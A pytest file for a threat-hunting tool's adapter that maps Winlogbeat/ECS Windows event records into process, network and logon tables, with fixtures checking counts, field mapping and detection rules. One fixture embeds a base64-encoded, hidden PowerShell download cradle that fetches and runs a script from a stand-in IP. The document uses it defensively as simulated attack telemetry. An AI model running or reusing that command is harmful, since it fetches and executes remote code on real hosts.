"""Tests for the Winlogbeat/ECS adapter, in the shape DEDALE's records actually have.

Every field name asserted here was read off a real Winlogbeat 7.10.2 / ECS 1.5.0 record
during the M14 step 0 probe. The adapter's job is three tables and an honest count of
everything else; the tests pin both halves.
"""

from __future__ import annotations

import base64
import bz2
import json
import zlib
from pathlib import Path

import pytest

from ath.hunting import run_hunt
from ath.schema import EVENT_CONTROL, EVENT_LOGON, EVENT_NETWORK, EVENT_PROCESS, SIG_UNKNOWN
from ath.telemetry.loader import Telemetry
from ath.telemetry.winlogbeat_source import WinlogbeatSource

ENCODED = base64.b64encode(
    "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a.ps1')".encode("utf-16le")
).decode("ascii")


def _sysmon1(host="CLIENT2.breach.local", record_id=100, name="powershell.exe",
             cmd=f"powershell.exe -nop -w hidden -enc {ENCODED}", parent="WINWORD.EXE",
             user="client2", ts="2025-01-06T10:01:05.579Z") -> dict:
    return {
        "@timestamp": ts, "agent": {"hostname": host.split(".")[0], "type": "winlogbeat"},
        "ecs": {"version": "1.5.0"},
        "event": {"code": 1, "provider": "Microsoft-Windows-Sysmon", "category": ["process"]},
        "host": {"name": host}, "user": {"domain": "BREACH", "name": user},
        "process": {
            "name": name, "pid": 4242, "command_line": cmd,
            "executable": f"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\{name}",
            "hash": {"sha256": "AB" * 32},
            "parent": {"name": parent, "pid": 1000, "command_line": f"{parent} /n"},
        },
        "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 1,
                   "record_id": record_id, "computer_name": host,
                   "event_data": {"Company": "Microsoft Corporation", "IntegrityLevel": "Medium"}},
    }


def _sysmon3(host="CLIENT2.breach.local", record_id=200, ts="2025-01-06T10:01:07.000Z") -> dict:
    return {
        "@timestamp": ts, "event": {"code": 3, "provider": "Microsoft-Windows-Sysmon"},
        "host": {"name": host}, "user": {"name": "client2"},
        "process": {"name": "powershell.exe", "pid": 4242},
        "source": {"ip": "172.19.3.12", "port": 50123},
        "destination": {"ip": "172.19.1.1", "port": 80},
        "network": {"transport": "tcp", "direction": "outbound"},
        "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 3,
                   "record_id": record_id, "event_data": {"Initiated": "true", "Protocol": "tcp"}},
    }


def _security(event_id: int, host="CLIENT16.breach.local", record_id=300, user="client2",
              logon_type="3", ip="172.19.3.12", workstation="CLIENT2", sub_status=None,
              ts="2025-01-06T10:02:00.000Z") -> dict:
    data = {"TargetUserName": user, "TargetDomainName": "BREACH", "LogonType": logon_type,
            "IpAddress": ip, "WorkstationName": workstation, "AuthenticationPackageName": "NTLM"}
    if sub_status is not None:
        data["Status"] = "0xc000006d"
        data["SubStatus"] = sub_status
    return {
        "@timestamp": ts, "event": {"code": event_id, "provider": "Microsoft-Windows-Security-Auditing",
                                    "outcome": "success" if event_id == 4624 else "failure"},
        "host": {"name": host},
        "winlog": {"channel": "Security", "event_id": event_id, "record_id": record_id,
                   "computer_name": host, "event_data": data},
    }


def _other(channel: str, event_id: int, record_id: int) -> dict:
    return {"@timestamp": "2025-01-06T10:00:00.000Z", "host": {"name": "CLIENT7.breach.local"},
            "winlog": {"channel": channel, "event_id": event_id, "record_id": record_id}}


def _write(path: Path, records: list[dict]) -> None:
    path.write_text("\n".join(json.dumps(r) for r in records) + "\n", encoding="utf-8")


@pytest.fixture
def records() -> list[dict]:
    return [
        _sysmon1(),
        _sysmon1(record_id=101, name="whoami.exe", cmd="whoami /all", parent="powershell.exe"),
        _sysmon3(),
        _security(4624),
        _security(4624, record_id=301, user="SYSTEM", logon_type="5", ip="-", workstation="-"),
        _security(4625, record_id=302, sub_status="0xC000006A"),
        _security(4625, record_id=303, sub_status="0xC0000999"),
        _other("Microsoft-Windows-Sysmon/Operational", 7, 400),
        _other("Microsoft-Windows-Sysmon/Operational", 7, 401),
        _other("Microsoft-Windows-Sysmon/Operational", 11, 402),
        _other("Security", 4672, 403),
        _other("Microsoft-Windows-PowerShell/Operational", 4104, 404),
    ]


@pytest.fixture
def result(tmp_path, records):
    _write(tmp_path / "winlogbeat.jsonl", records)
    return WinlogbeatSource(tmp_path).load()


def test_counts_are_honest_including_unmapped_channels(result) -> None:
    assert result.rows_read == 12
    assert result.rows_kept == 7
    assert result.rows_dropped == 5
    assert result.issues == []
    assert result.unmapped == {
        "Microsoft-Windows-Sysmon/Operational:7": 2,
        "Microsoft-Windows-Sysmon/Operational:11": 1,
        "Security:4672": 1,
        "Microsoft-Windows-PowerShell/Operational:4104": 1,
    }


def test_sysmon_process_create_maps_to_the_process_table(result) -> None:
    df = result.tables[EVENT_PROCESS]
    assert len(df) == 2
    row = df.iloc[0]
    assert row["device"] == "CLIENT2"
    assert row["user"] == "client2"
    assert row["process_name"] == "powershell.exe"
    assert row["process_id"] == 4242
    assert row["parent_process_name"] == "WINWORD.EXE"
    assert row["parent_process_id"] == 1000
    assert "-enc" in row["command_line"]
    assert row["file_path"].endswith("powershell.exe")
    assert row["sha256"] == "ab" * 32


def test_version_info_company_is_not_a_signature(result) -> None:
    row = result.tables[EVENT_PROCESS].iloc[0]
    assert row["signer"] == "Microsoft Corporation"
    assert row["signature_status"] == SIG_UNKNOWN


def test_sysmon_network_connection_maps_to_the_network_table(result) -> None:
    df = result.tables[EVENT_NETWORK]
    assert len(df) == 1
    row = df.iloc[0]
    assert row["remote_ip"] == "172.19.1.1"
    assert row["remote_port"] == 80
    assert row["protocol"] == "tcp"
    assert row["direction"] == "outbound"
    assert row["process_name"] == "powershell.exe"
    assert row["remote_url"] == ""


def test_security_logons_keep_the_numeric_logon_type(result) -> None:
    df = result.tables[EVENT_LOGON]
    assert len(df) == 4
    ok = df[df["action"] == "success"]
    assert sorted(ok["logon_type"].tolist()) == [3, 5]
    interactive = ok[ok["user"] == "client2"].iloc[0]
    assert interactive["source_ip"] == "172.19.3.12"
    assert interactive["source_device"] == "CLIENT2"
    assert interactive["device"] == "CLIENT16"
    system = ok[ok["user"] == "SYSTEM"].iloc[0]
    assert system["source_ip"] == ""       # "-" becomes empty, never a literal dash
    assert system["source_device"] == ""


def test_logon_failure_reasons_are_named_when_known_and_kept_raw_otherwise(result) -> None:
    failures = result.tables[EVENT_LOGON][result.tables[EVENT_LOGON]["action"] == "failure"]
    assert sorted(failures["failure_reason"].tolist()) == ["0xc0000999", "bad_password"]


def test_source_ref_carries_the_label_key_triple(result) -> None:
    refs = result.tables[EVENT_PROCESS]["source_ref"].tolist()
    assert refs[0].startswith("host=CLIENT2.breach.local;channel=Microsoft-Windows-Sysmon/Operational;record_id=100;")
    assert all("File=winlogbeat.jsonl" in r for r in refs)


def test_control_table_is_present_and_empty(result) -> None:
    assert result.tables[EVENT_CONTROL].empty


def test_bz2_and_zip_deflated_bz2_read_identically(tmp_path, records, result) -> None:
    payload = ("\n".join(json.dumps(r) for r in records) + "\n").encode("utf-8")
    plain_bz2 = bz2.compress(payload)
    (tmp_path / "a").mkdir()
    (tmp_path / "a" / "hour.jsonl.bz2").write_bytes(plain_bz2)
    compressor = zlib.compressobj(wbits=-15)
    deflated = compressor.compress(plain_bz2) + compressor.flush()
    (tmp_path / "b").mkdir()
    (tmp_path / "b" / "hour.jsonl.bz2").write_bytes(deflated)
    for sub in ("a", "b"):
        loaded = WinlogbeatSource(tmp_path / sub).load()
        assert loaded.rows_read == result.rows_read
        assert loaded.rows_kept == result.rows_kept
        assert loaded.unmapped == result.unmapped


def test_malformed_lines_are_per_row_issues(tmp_path, records) -> None:
    lines = [json.dumps(r) for r in records]
    lines.insert(2, "{not json")
    (tmp_path / "w.jsonl").write_text("\n".join(lines) + "\n", encoding="utf-8")
    loaded = WinlogbeatSource(tmp_path).load()
    assert loaded.rows_read == 13
    assert len(loaded.issues) == 1
    assert loaded.issues[0].raw_reference == "w.jsonl#line=3"


def test_mapped_class_rows_missing_essentials_are_issues_not_silently_kept(tmp_path) -> None:
    bad = _sysmon1()
    bad["process"] = {"pid": 1}          # no name, no executable
    no_time = _security(4624)
    no_time["@timestamp"] = "yesterday"
    _write(tmp_path / "w.jsonl", [bad, no_time])
    loaded = WinlogbeatSource(tmp_path).load()
    assert loaded.rows_kept == 0
    reasons = " ".join(i.reason for i in loaded.issues)
    assert "names no image" in reasons
    assert "unparseable timestamp" in reasons


def test_existing_rules_fire_on_ecs_shaped_telemetry_unchanged(result) -> None:
    """The DEDALE attack opens with Office spawning encoded PowerShell, then discovery."""
    telemetry = Telemetry(
        processes=result.tables[EVENT_PROCESS], network=result.tables[EVENT_NETWORK],
        logons=result.tables[EVENT_LOGON], controls=result.tables[EVENT_CONTROL],
    )
    fired = {f.rule_id for f in run_hunt(telemetry).findings}
    assert {"ATH-001", "ATH-002"} <= fired


def test_missing_directory_fails_clearly(tmp_path) -> None:
    with pytest.raises(FileNotFoundError, match="No Winlogbeat"):
        WinlogbeatSource(tmp_path / "nope").load()
